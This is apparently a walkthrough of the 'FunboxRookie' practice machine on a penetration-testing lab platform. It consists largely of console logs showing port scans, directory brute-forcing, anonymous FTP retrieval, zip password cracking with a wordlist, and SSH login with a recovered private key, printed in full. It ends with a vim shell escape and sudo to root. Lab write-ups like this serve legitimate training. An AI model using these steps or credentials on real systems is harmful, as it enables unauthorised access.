# Recon

```console
root@kali:/OSCPv3/offsec_pg/FunboxRookie# nmap -Pn -sT -n -p- 192.168.74.107  --reason --min-rate 1000 --max-retries 2 -v
Starting Nmap 7.70 ( https://nmap.org ) at 2021-10-13 15:17 CDT
Initiating Connect Scan at 15:17
Scanning 192.168.74.107 [65535 ports]
Discovered open port 21/tcp on 192.168.74.107
Discovered open port 22/tcp on 192.168.74.107
Discovered open port 80/tcp on 192.168.74.107
Warning: 192.168.74.107 giving up on port because retransmission cap hit (2).
Connect Scan Timing: About 38.05% done; ETC: 15:18 (0:00:50 remaining)
Completed Connect Scan at 15:18, 92.74s elapsed (65535 total ports)
Nmap scan report for 192.168.74.107
Host is up, received user-set (0.087s latency).
Not shown: 58017 closed ports, 7515 filtered ports
Reason: 58017 conn-refused and 7515 no-responses
PORT   STATE SERVICE REASON
21/tcp open  ftp     syn-ack
22/tcp open  ssh     syn-ack
80/tcp open  http    syn-ack

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 92.82 seconds
```

```console
root@kali:/OSCPv3/offsec_pg/FunboxRookie# nmap -Pn -sT -A -n 192.168.74.107 -p 80,21,22
Starting Nmap 7.70 ( https://nmap.org ) at 2021-10-13 15:42 CDT
Nmap scan report for 192.168.74.107
Host is up (0.088s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     ProFTPD 1.3.5e
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 anna.zip
| -rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 ariel.zip
| -rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 bud.zip
| -rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 cathrine.zip
| -rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 homer.zip
| -rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 jessica.zip
| -rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 john.zip
| -rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 marge.zip
| -rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 miriam.zip
| -r--r--r--   1 ftp      ftp          1477 Jul 25  2020 tom.zip
| -rw-r--r--   1 ftp      ftp           170 Jan 10  2018 welcome.msg
|_-rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 zlatan.zip
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 f9:46:7d:fe:0c:4d:a9:7e:2d:77:74:0f:a2:51:72:51 (RSA)
|   256 15:00:46:67:80:9b:40:12:3a:0c:66:07:db:1d:18:47 (ECDSA)
|_  256 75:ba:66:95:bb:0f:16:de:7e:7e:a1:7b:27:3b:b0:58 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
| http-robots.txt: 1 disallowed entry 
|_/logs/
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 2.6.18 - 2.6.22 (94%), Linux 2.6.18 (91%), Linux 2.6.32 (90%), Linux 2.6.39 (90%), Linux 3.10 - 3.12 (90%), Linux 3.4 (90%), Linux 3.5 (90%), Linux 3.7 (90%), Linux 4.2 (90%), Linux 4.4 (90%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using proto 1/icmp)
HOP RTT      ADDRESS
1   91.58 ms 192.168.49.1
2   91.74 ms 192.168.74.107

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 35.19 seconds
```

# HTTP TCP/80

```console
root@kali:/OSCPv3/offsec_pg/FunboxRookie# nmap -sV --script=http-enum 192.168.74.107 -p 80
Starting Nmap 7.70 ( https://nmap.org ) at 2021-10-13 15:30 CDT
Nmap scan report for 192.168.74.107
Host is up (0.076s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
| http-enum: 
|_  /robots.txt: Robots file
|_http-server-header: Apache/2.4.29 (Ubuntu)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 31.77 seconds
root@kali:/OSCPv3/offsec_pg/FunboxRookie# 
```

```console
root@kali:/OSCPv3/offsec_pg/FunboxRookie# dirb http://192.168.74.107

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Wed Oct 13 15:32:16 2021
URL_BASE: http://192.168.74.107/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://192.168.74.107/ ----
+ http://192.168.74.107/index.html (CODE:200|SIZE:10918)                                                                                       
+ http://192.168.74.107/robots.txt (CODE:200|SIZE:17)                                                                                          
+ http://192.168.74.107/server-status (CODE:403|SIZE:279)                                                                                      
                                                                                                                                               
-----------------
END_TIME: Wed Oct 13 15:40:51 2021
DOWNLOADED: 4612 - FOUND: 3
root@kali:/OSCPv3/offsec_pg/FunboxRookie# 
```

```console
root@kali:/OSCPv3/offsec_pg/FunboxRookie# gobuster -u http://192.168.74.107 -t 50 -w /usr/share/dirb/wordlists/big.txt -x .php,.html,.txt -r 

Gobuster v1.4.1              OJ Reeves (@TheColonial)
=====================================================
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://192.168.74.107/
[+] Threads      : 50
[+] Wordlist     : /usr/share/dirb/wordlists/big.txt
[+] Status codes : 204,301,302,307,200
[+] Extensions   : .php,.html,.txt
[+] Follow Redir : true
=====================================================
/index.html (Status: 200)
/robots.txt (Status: 200)
/robots.txt (Status: 200)
=====================================================
```

```console
root@kali:/OSCPv3/offsec_pg/FunboxRookie# python3 /opt/dirsearch/dirsearch.py -u http://192.168.74.107 -e php,html,txt -x 403

 _|. _ _  _  _  _ _|_    v0.3.9
(_||| _) (/_(_|| (_| )

Extensions: php, html, txt | HTTP method: get | Threads: 10 | Wordlist size: 6748

Error Log: /opt/dirsearch/logs/errors-21-10-13_16-22-37.log

Target: http://192.168.74.107

[16:22:38] Starting: 
[16:23:30] 200 -   11KB - /index.html
[16:23:49] 200 -   17B  - /robots.txt

Task Completed
```


```console
root@kali:/OSCPv3/offsec_pg/FunboxRookie# wfuzz -c -t 500 --hc=404 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://192.168.74.107/FUZZ

Warning: Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.

********************************************************
* Wfuzz 2.2.11 - The Web Fuzzer                        *
********************************************************

Target: http://192.168.74.107/FUZZ
Total requests: 220560

==================================================================
ID	Response   Lines      Word         Chars          Payload    
==================================================================

000005:  C=200    375 L	     964 W	  10918 Ch	  "# This work is licensed under the Creative Commons"
000006:  C=200    375 L	     964 W	  10918 Ch	  "# Attribution-Share Alike 3.0 License. To view a copy of this"
000007:  C=200    375 L	     964 W	  10918 Ch	  "# license, visit http://creativecommons.org/licenses/by-sa/3.0/"
000008:  C=200    375 L	     964 W	  10918 Ch	  "# or send a letter to Creative Commons, 171 Second Street,"
000009:  C=200    375 L	     964 W	  10918 Ch	  "# Suite 300, San Francisco, California, 94105, USA."
000010:  C=200    375 L	     964 W	  10918 Ch	  "#"
000011:  C=200    375 L	     964 W	  10918 Ch	  "# Priority ordered case sensative list, where entries were found"
000012:  C=200    375 L	     964 W	  10918 Ch	  "# on atleast 2 different hosts"
000013:  C=200    375 L	     964 W	  10918 Ch	  "#"
000014:  C=200    375 L	     964 W	  10918 Ch	  ""
000001:  C=200    375 L	     964 W	  10918 Ch	  "# directory-list-2.3-medium.txt"
000002:  C=200    375 L	     964 W	  10918 Ch	  "#"
000003:  C=200    375 L	     964 W	  10918 Ch	  "# Copyright 2007 James Fisher"
000004:  C=200    375 L	     964 W	  10918 Ch	  "#"
034432:  C=404      9 L	      31 W	    276 Ch	  "irp"
Fatal exception: Pycurl error 28: Operation timed out after 90008 milliseconds with 0 bytes received
```

```console
root@kali:/OSCPv3/offsec_pg/FunboxRookie# wfuzz -c -t 500 --hc=404 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -w ext.txt http://192.168.74.107/FUZZ.FUZ2Z

Warning: Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.

********************************************************
* Wfuzz 2.2.11 - The Web Fuzzer                        *
********************************************************

Target: http://192.168.74.107/FUZZ.FUZ2Z
Total requests: 882240

==================================================================
ID	Response   Lines      Word         Chars          Payload    
==================================================================

000001:  C=200    375 L	     964 W	  10918 Ch	  "# directory-list-2.3-medium.txt - php"
000002:  C=200    375 L	     964 W	  10918 Ch	  "# directory-list-2.3-medium.txt - txt"
000003:  C=200    375 L	     964 W	  10918 Ch	  "# directory-list-2.3-medium.txt - html"
000004:  C=200    375 L	     964 W	  10918 Ch	  "# directory-list-2.3-medium.txt - xml"
000006:  C=200    375 L	     964 W	  10918 Ch	  "# - txt"
000005:  C=200    375 L	     964 W	  10918 Ch	  "# - php"
000007:  C=200    375 L	     964 W	  10918 Ch	  "# - html"
000008:  C=200    375 L	     964 W	  10918 Ch	  "# - xml"
000009:  C=200    375 L	     964 W	  10918 Ch	  "# Copyright 2007 James Fisher - php"
000010:  C=200    375 L	     964 W	  10918 Ch	  "# Copyright 2007 James Fisher - txt"
000012:  C=200    375 L	     964 W	  10918 Ch	  "# Copyright 2007 James Fisher - xml"
000011:  C=200    375 L	     964 W	  10918 Ch	  "# Copyright 2007 James Fisher - html"
000014:  C=200    375 L	     964 W	  10918 Ch	  "# - txt"
000013:  C=200    375 L	     964 W	  10918 Ch	  "# - php"
000015:  C=200    375 L	     964 W	  10918 Ch	  "# - html"
000016:  C=200    375 L	     964 W	  10918 Ch	  "# - xml"
000017:  C=200    375 L	     964 W	  10918 Ch	  "# This work is licensed under the Creative Commons - php"
000029:  C=200    375 L	     964 W	  10918 Ch	  "# or send a letter to Creative Commons, 171 Second Street, - php"
000018:  C=200    375 L	     964 W	  10918 Ch	  "# This work is licensed under the Creative Commons - txt"
000023:  C=200    375 L	     964 W	  10918 Ch	  "# Attribution-Share Alike 3.0 License. To view a copy of this - html"
000019:  C=200    375 L	     964 W	  10918 Ch	  "# This work is licensed under the Creative Commons - html"
000020:  C=200    375 L	     964 W	  10918 Ch	  "# This work is licensed under the Creative Commons - xml"
000021:  C=200    375 L	     964 W	  10918 Ch	  "# Attribution-Share Alike 3.0 License. To view a copy of this - php"
000022:  C=200    375 L	     964 W	  10918 Ch	  "# Attribution-Share Alike 3.0 License. To view a copy of this - txt"
000024:  C=200    375 L	     964 W	  10918 Ch	  "# Attribution-Share Alike 3.0 License. To view a copy of this - xml"
000025:  C=200    375 L	     964 W	  10918 Ch	  "# license, visit http://creativecommons.org/licenses/by-sa/3.0/ - php"
000026:  C=200    375 L	     964 W	  10918 Ch	  "# license, visit http://creativecommons.org/licenses/by-sa/3.0/ - txt"
000027:  C=200    375 L	     964 W	  10918 Ch	  "# license, visit http://creativecommons.org/licenses/by-sa/3.0/ - html"
000028:  C=200    375 L	     964 W	  10918 Ch	  "# license, visit http://creativecommons.org/licenses/by-sa/3.0/ - xml"
000035:  C=200    375 L	     964 W	  10918 Ch	  "# Suite 300, San Francisco, California, 94105, USA. - html"
000030:  C=200    375 L	     964 W	  10918 Ch	  "# or send a letter to Creative Commons, 171 Second Street, - txt"
000031:  C=200    375 L	     964 W	  10918 Ch	  "# or send a letter to Creative Commons, 171 Second Street, - html"
000032:  C=200    375 L	     964 W	  10918 Ch	  "# or send a letter to Creative Commons, 171 Second Street, - xml"
000033:  C=200    375 L	     964 W	  10918 Ch	  "# Suite 300, San Francisco, California, 94105, USA. - php"
000034:  C=200    375 L	     964 W	  10918 Ch	  "# Suite 300, San Francisco, California, 94105, USA. - txt"
000036:  C=200    375 L	     964 W	  10918 Ch	  "# Suite 300, San Francisco, California, 94105, USA. - xml"
000038:  C=200    375 L	     964 W	  10918 Ch	  "# - txt"
000037:  C=200    375 L	     964 W	  10918 Ch	  "# - php"
000039:  C=200    375 L	     964 W	  10918 Ch	  "# - html"
000043:  C=200    375 L	     964 W	  10918 Ch	  "# Priority ordered case sensative list, where entries were found - html"
000040:  C=200    375 L	     964 W	  10918 Ch	  "# - xml"
000041:  C=200    375 L	     964 W	  10918 Ch	  "# Priority ordered case sensative list, where entries were found - php"
000042:  C=200    375 L	     964 W	  10918 Ch	  "# Priority ordered case sensative list, where entries were found - txt"
000050:  C=200    375 L	     964 W	  10918 Ch	  "# - txt"
000045:  C=200    375 L	     964 W	  10918 Ch	  "# on atleast 2 different hosts - php"
000046:  C=200    375 L	     964 W	  10918 Ch	  "# on atleast 2 different hosts - txt"
000047:  C=200    375 L	     964 W	  10918 Ch	  "# on atleast 2 different hosts - html"
000048:  C=200    375 L	     964 W	  10918 Ch	  "# on atleast 2 different hosts - xml"
000049:  C=200    375 L	     964 W	  10918 Ch	  "# - php"
000051:  C=200    375 L	     964 W	  10918 Ch	  "# - html"
000052:  C=200    375 L	     964 W	  10918 Ch	  "# - xml"
000053:  C=403      9 L	      28 W	    279 Ch	  " - php"
000055:  C=403      9 L	      28 W	    279 Ch	  " - html"
000059:  C=200    375 L	     964 W	  10918 Ch	  "index - html"
000044:  C=200    375 L	     964 W	  10918 Ch	  "# Priority ordered case sensative list, where entries were found - xml"
007058:  C=200      1 L	       2 W	     17 Ch	  "robots - txt"
032357:  C=404      9 L	      31 W	    276 Ch	  "tetris - php"
Fatal exception: Pycurl error 28: Operation timed out after 90014 milliseconds with 0 bytes received
```

## FTP TCP/21

```console
root@kali:/OSCPv3/offsec_pg/FunboxRookie# ftp 192.168.74.107
Connected to 192.168.74.107.
220 ProFTPD 1.3.5e Server (Debian) [::ffff:192.168.74.107]
Name (192.168.74.107:root): anonymous
331 Anonymous login ok, send your complete email address as your password
Password:
230-Welcome, archive user anonymous@192.168.49.74 !
230-
230-The local time is: Wed Oct 13 20:26:50 2021
230-
230-This is an experimental FTP server.  If you have any unusual problems,
230-please report them via e-mail to <root@funbox2>.
230-
230 Anonymous access granted, restrictions apply
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> dir
200 PORT command successful
150 Opening ASCII mode data connection for file list
-rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 anna.zip
-rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 ariel.zip
-rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 bud.zip
-rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 cathrine.zip
-rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 homer.zip
-rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 jessica.zip
-rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 john.zip
-rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 marge.zip
-rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 miriam.zip
-r--r--r--   1 ftp      ftp          1477 Jul 25  2020 tom.zip
-rw-r--r--   1 ftp      ftp           170 Jan 10  2018 welcome.msg
-rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 zlatan.zip
226 Transfer complete
ftp> 
```

```console
root@kali:/OSCPv3/offsec_pg/FunboxRookie# fcrackzip -u -D -p '/usr/share/wordlists/rockyou.txt' cathrine.zip 


PASSWORD FOUND!!!!: pw == catwoman
root@kali:/OSCPv3/offsec_pg/FunboxRookie# fcrackzip -u -D -p '/usr/share/wordlists/rockyou.txt' jessica.zip 
root@kali:/OSCPv3/offsec_pg/FunboxRookie# fcrackzip -u -D -p '/usr/share/wordlists/rockyou.txt' marge.zip 
root@kali:/OSCPv3/offsec_pg/FunboxRookie# fcrackzip -u -D -p '/usr/share/wordlists/rockyou.txt' tom.zip 


PASSWORD FOUND!!!!: pw == iubire
root@kali:/OSCPv3/offsec_pg/FunboxRookie# fcrackzip -u -D -p '/usr/share/wordlists/rockyou.txt' zlatan.zip 
root@kali:/OSCPv3/offsec_pg/FunboxRookie# fcrackzip -u -D -p '/usr/share/wordlists/rockyou.txt' anna.zip 
root@kali:/OSCPv3/offsec_pg/FunboxRookie# fcrackzip -u -D -p '/usr/share/wordlists/rockyou.txt' bud.zip 
root@kali:/OSCPv3/offsec_pg/FunboxRookie# fcrackzip -u -D -p '/usr/share/wordlists/rockyou.txt' homer.zip 
root@kali:/OSCPv3/offsec_pg/FunboxRookie# fcrackzip -u -D -p '/usr/share/wordlists/rockyou.txt' john.zip 
root@kali:/OSCPv3/offsec_pg/FunboxRookie# fcrackzip -u -D -p '/usr/share/wordlists/rockyou.txt' miriam.zip
```

```console
root@kali:/OSCPv3/offsec_pg/FunboxRookie# unzip cathrine.zip 
Archive:  cathrine.zip
[cathrine.zip] id_rsa password: 
  inflating: id_rsa 

root@kali:/OSCPv3/offsec_pg/FunboxRookie# more id_rsa 
-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEA6/v83+Ih99kKEhLa9XL0H7ugQzx5tQMK8/DrzgGR7gWnkXgH
GjyG+roZJyqHTEBi62/IyyiAxkX0Uh4NgEqh4LWQRy4dhc+bP6GYYrMezPiljzTp
Sc15tN+6Txtx0gOb0LPttVemJoFXZ1wQsNivCvEzxSESGTGR5p2QUybMlk2dS2UC
Mn6FvcHCcKyBRUK9udIh29wGo0+pnuRw2SrKY9PzidP6Ao3sxJrlAJ5+SQkA86ZV
pIhAIZyQHX2frjEEiQgVbwzTLWP2ezMZp195cINiJcIAuTLp2hKZLTDqL/U9ncUs
Y2qbFVqQQfn8078Wbe4NrUBU2rkMtz6iE+BWhwIDAQABAoIBAAhrKvBJvvB6m7Nd
XNZYzYC8TtFXPPhKLX/aXm8w+yXEqd+0qnwzIJWdQfx1tfHwchb4G++zeDSalka/
r7ed8fx0PbtsV71IVL+GYktTHIwvaqibOJ9bZzYerSTZU8wsOMjPQnGvuMuy3Y1g
aXAFquj3BePIdD7V1+CkSlvNDItoE+LsZvdQQBAA/q648FiBzaiBE6swXZwqc4sR
P1igsqihOdjaK1AvPd5BSEMZDNF5KpMqIcEz1Xt8UceCj/r5+tshg4rOFz2/oYOo
ax+P6Dez7+PXzNz9d5Rp1a1dnluImvU+2DnJAQF1c/hccjTyS/05IXErKjFZ+XQH
zgEz+EECgYEA/VjZ2ccViV70QOmdeJ/yXjysVnBy+BulTUhD640Cm8tcDPemeOlN
7LTgwFuGoi+oygXka4mWT4BMGa5hubivkr3MEwuRYZaiq7OMU1VVkivuYkNMtBgC
qlr2HghOxCthXWsThXWFSWVkiR8V4sbkRc3DvPRRl6m5B35TBhURADECgYEA7nSX
pwb6rtHgQ5WNtl2wDcWNk8RRGWvY0Y0RsYwY7kk01lttpoHd4v2k2CzxU5xVeo+D
nthqv26Huo8LT5AeCocWfP0I6BSUQsFO37m6NwXvDJwyNfywu61h5CDMt71M3nZi
N2TkW0WzTFuQYppEfCXYjxoZEvqsDxON4KXnDDcCgYA09s9MdQ9ukZhUvcI7Bo0/
4EVTKN0QO49aUcJJS0iBU4lh+KAn5PZyhvn5nOjPnVEXMxYm2TPAWR0PvWIW1qJ1
9hHk5WU2VqyZYsbyYQOrtF1404MEn4RnIu8TJj95SWxogEsren8r8fOLqyEDMPtm
EHdcWGN6ZnQVOfaXbe4I8QKBgQDE0uomjSU4TbZOMtDBOb3K8Ei3MrE6SYGzHjz/
j0M41KZPVTJB4SoUZga+BQLBX+ZSfslGwR4DmylffRj5+FxDllOioX3LiskB/Ous
0XH6XuR9RSRQ2Z3LnAaUNdqkwxUC/zZ8wMOY7wRbP60DJpDm5JpHLGSL/OsumpZe
WrJGqwKBgB5E+zY/udYEndjuE0edYbXMsu1kQQ/w4oXIv2o2r44W3Wkbh9bvCgCJ
mOGTmkqb3grpy4sp/5QQFtE10fh1Ll+BXsK46HE2pPtg/JHoXyeFevpLXi8YgYjQ
22nBTFCyu2vcWKEQI21H7Rej9FGyFSnPedDNp0C58WPdEuGIC/tr
-----END RSA PRIVATE KEY-----

```

```console
root@kali:/OSCPv3/offsec_pg/FunboxRookie# unzip tom.zip 
Archive:  tom.zip
[tom.zip] id_rsa password: 
  inflating: id_rsa                  
root@kali:/OSCPv3/offsec_pg/FunboxRookie# 
root@kali:/OSCPv3/offsec_pg/FunboxRookie# more id_rsa
-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEA6/v83+Ih99kKEhLa9XL0H7ugQzx5tQMK8/DrzgGR7gWnkXgH
GjyG+roZJyqHTEBi62/IyyiAxkX0Uh4NgEqh4LWQRy4dhc+bP6GYYrMezPiljzTp
Sc15tN+6Txtx0gOb0LPttVemJoFXZ1wQsNivCvEzxSESGTGR5p2QUybMlk2dS2UC
Mn6FvcHCcKyBRUK9udIh29wGo0+pnuRw2SrKY9PzidP6Ao3sxJrlAJ5+SQkA86ZV
pIhAIZyQHX2frjEEiQgVbwzTLWP2ezMZp195cINiJcIAuTLp2hKZLTDqL/U9ncUs
Y2qbFVqQQfn8078Wbe4NrUBU2rkMtz6iE+BWhwIDAQABAoIBAAhrKvBJvvB6m7Nd
XNZYzYC8TtFXPPhKLX/aXm8w+yXEqd+0qnwzIJWdQfx1tfHwchb4G++zeDSalka/
r7ed8fx0PbtsV71IVL+GYktTHIwvaqibOJ9bZzYerSTZU8wsOMjPQnGvuMuy3Y1g
aXAFquj3BePIdD7V1+CkSlvNDItoE+LsZvdQQBAA/q648FiBzaiBE6swXZwqc4sR
P1igsqihOdjaK1AvPd5BSEMZDNF5KpMqIcEz1Xt8UceCj/r5+tshg4rOFz2/oYOo
ax+P6Dez7+PXzNz9d5Rp1a1dnluImvU+2DnJAQF1c/hccjTyS/05IXErKjFZ+XQH
zgEz+EECgYEA/VjZ2ccViV70QOmdeJ/yXjysVnBy+BulTUhD640Cm8tcDPemeOlN
7LTgwFuGoi+oygXka4mWT4BMGa5hubivkr3MEwuRYZaiq7OMU1VVkivuYkNMtBgC
qlr2HghOxCthXWsThXWFSWVkiR8V4sbkRc3DvPRRl6m5B35TBhURADECgYEA7nSX
pwb6rtHgQ5WNtl2wDcWNk8RRGWvY0Y0RsYwY7kk01lttpoHd4v2k2CzxU5xVeo+D
nthqv26Huo8LT5AeCocWfP0I6BSUQsFO37m6NwXvDJwyNfywu61h5CDMt71M3nZi
N2TkW0WzTFuQYppEfCXYjxoZEvqsDxON4KXnDDcCgYA09s9MdQ9ukZhUvcI7Bo0/
4EVTKN0QO49aUcJJS0iBU4lh+KAn5PZyhvn5nOjPnVEXMxYm2TPAWR0PvWIW1qJ1
9hHk5WU2VqyZYsbyYQOrtF1404MEn4RnIu8TJj95SWxogEsren8r8fOLqyEDMPtm
EHdcWGN6ZnQVOfaXbe4I8QKBgQDE0uomjSU4TbZOMtDBOb3K8Ei3MrE6SYGzHjz/
j0M41KZPVTJB4SoUZga+BQLBX+ZSfslGwR4DmylffRj5+FxDllOioX3LiskB/Ous
0XH6XuR9RSRQ2Z3LnAaUNdqkwxUC/zZ8wMOY7wRbP60DJpDm5JpHLGSL/OsumpZe
WrJGqwKBgB5E+zY/udYEndjuE0edYbXMsu1kQQ/w4oXIv2o2r44W3Wkbh9bvCgCJ
mOGTmkqb3grpy4sp/5QQFtE10fh1Ll+BXsK46HE2pPtg/JHoXyeFevpLXi8YgYjQ
22nBTFCyu2vcWKEQI21H7Rej9FGyFSnPedDNp0C58WPdEuGIC/tr
-----END RSA PRIVATE KEY-----
```

# Explotation


```console
root@kali:/OSCPv3/offsec_pg/FunboxRookie# ssh -i id_rsa tom@192.168.74.107
Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-117-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Wed Oct 13 21:42:28 UTC 2021

  System load:  0.0               Processes:             165
  Usage of /:   75.0% of 4.37GB   Users logged in:       0
  Memory usage: 38%               IP address for ens256: 192.168.74.107
  Swap usage:   0%


30 packages can be updated.
0 updates are security updates.



The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

tom@funbox2:~$ whoami
tom
tom@funbox2:~$ 
tom@funbox2:~$ cat local.txt
aabc37540a2d009f51a47912c1b0de5c

```
```console
tom@funbox2:~$ vim
:set shell=/bin/sh
:shell

$ /bin/bash
```


```console
tom@funbox2:/$ find / -perm -u=s -type f 2>/dev/null
/snap/core/10126/bin/mount
/snap/core/10126/bin/ping
/snap/core/10126/bin/ping6
/snap/core/10126/bin/su
/snap/core/10126/bin/umount
/snap/core/10126/usr/bin/chfn
/snap/core/10126/usr/bin/chsh
/snap/core/10126/usr/bin/gpasswd
/snap/core/10126/usr/bin/newgrp
/snap/core/10126/usr/bin/passwd
/snap/core/10126/usr/bin/sudo
/snap/core/10126/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core/10126/usr/lib/openssh/ssh-keysign
/snap/core/10126/usr/lib/snapd/snap-confine
/snap/core/10126/usr/sbin/pppd
/snap/core/9993/bin/mount
/snap/core/9993/bin/ping
/snap/core/9993/bin/ping6
/snap/core/9993/bin/su
/snap/core/9993/bin/umount
/snap/core/9993/usr/bin/chfn
/snap/core/9993/usr/bin/chsh
/snap/core/9993/usr/bin/gpasswd
/snap/core/9993/usr/bin/newgrp
/snap/core/9993/usr/bin/passwd
/snap/core/9993/usr/bin/sudo
/snap/core/9993/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core/9993/usr/lib/openssh/ssh-keysign
/snap/core/9993/usr/lib/snapd/snap-confine
/snap/core/9993/usr/sbin/pppd
/bin/su
/bin/umount
/bin/mount
/bin/fusermount
/bin/ping
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/lib/eject/dmcrypt-get-device
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/snapd/snap-confine
/usr/bin/chsh
/usr/bin/newuidmap
/usr/bin/passwd
/usr/bin/sudo
/usr/bin/chfn
/usr/bin/newgrp
/usr/bin/gpasswd
/usr/bin/traceroute6.iputils
/usr/bin/pkexec
/usr/bin/newgidmap
/usr/bin/at

```


```console
tom@funbox2:~$ cat .mysql_history 
_HiStOrY_V2_
show\040databases;
quit
create\040database\040'support';
create\040database\040support;
use\040support
create\040table\040users;
show\040tables
;
select\040*\040from\040support
;
show\040tables;
select\040*\040from\040support;
insert\040into\040support\040(tom,\040xx11yy22!);
quit
```

```console
tom@funbox2:~$ sudo -l
[sudo] password for tom: 
Matching Defaults entries for tom on funbox2:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User tom may run the following commands on funbox2:
    (ALL : ALL) ALL
```


```console
tom@funbox2:~$ sudo /bin/bash 
root@funbox2:~# whoami
root
root@funbox2:~# 
```
```console
root@funbox2:~# cd /root/
root@funbox2:/root# ls
flag.txt  proof.txt
root@funbox2:/root# cat flag.txt 
Your flag is in another file...
root@funbox2:/root# cat proof.txt 
496e5e043d5cd47427ed97fa0be8ba8e
root@funbox2:/root# 
```

### References
https://scund00r.com/all/oscp/2018/02/25/passing-oscp.html#enumeration
https://github.com/Tib3rius/Pentest-Cheatsheets/blob/master/privilege-escalation/linux/linux-examples.rst
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md#scheduled-tasks
https://book.hacktricks.xyz/linux-unix/privilege-escalation
